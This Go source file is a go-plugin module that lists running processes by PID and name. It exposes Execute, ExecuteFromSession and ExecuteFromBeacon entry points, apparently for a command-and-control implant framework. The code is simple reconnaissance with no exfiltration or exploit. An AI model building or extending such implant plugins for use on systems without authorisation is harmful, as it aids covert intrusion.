package main

import (
	"fmt"
	"strings"

	"github.com/shirou/gopsutil/v3/process"

	"src/Client/dynamic/shared"
	Logger "src/Client/generic/logger"

	"github.com/hashicorp/go-plugin"
)

var (
	pluginName = "processes"
)

// Replace 'YourCommandImpl' with the specific name for your new command.
// This struct will implement the shared.Command interface.
type ListProcessesCommand struct{}

// Execute is called when the command is run in the default context.
func (c *ListProcessesCommand) Execute(args []string) (string, error) {
	Logger.Log("ListProcessesCommand.Execute called")
	procs, err := process.Processes()
	if err != nil {
		return "", err
	}
	var out []string
	for _, p := range procs {
		if name, err := p.Name(); err == nil {
			out = append(out, fmt.Sprintf("%d: %s", p.Pid, name))
		}
	}
	return strings.Join(out, "\n"), nil
}

// ExecuteFromSession is called when the command is run from a session context.
func (c *ListProcessesCommand) ExecuteFromSession(args []string) (string, error) {
	Logger.Log("ListProcessesCommand.ExecuteFromSession called")
	return c.Execute(args)
}

// ExecuteFromBeacon is called when the command is run from a beacon context.
// 'data' might contain additional information passed from the beacon.
func (c *ListProcessesCommand) ExecuteFromBeacon(args []string, data string) (string, error) {
	Logger.Log(fmt.Sprintf("ListProcessesCommand.ExecuteFromBeacon called with data: %s", data))

	output, err := c.Execute(args) // Example: Reuse default execute logic
	if err != nil {
		Logger.Error(fmt.Sprintf("Error in beacon context: %v", err))
		return "", err
	}
	return output, nil
}

// --- Main function for the plugin executable ---

func main() {

	plugin.Serve(&plugin.ServeConfig{
		HandshakeConfig: shared.HandshakeConfig,
		Plugins: map[string]plugin.Plugin{
			pluginName: &shared.CommandPlugin{Impl: &ListProcessesCommand{}},
		},
	})
}
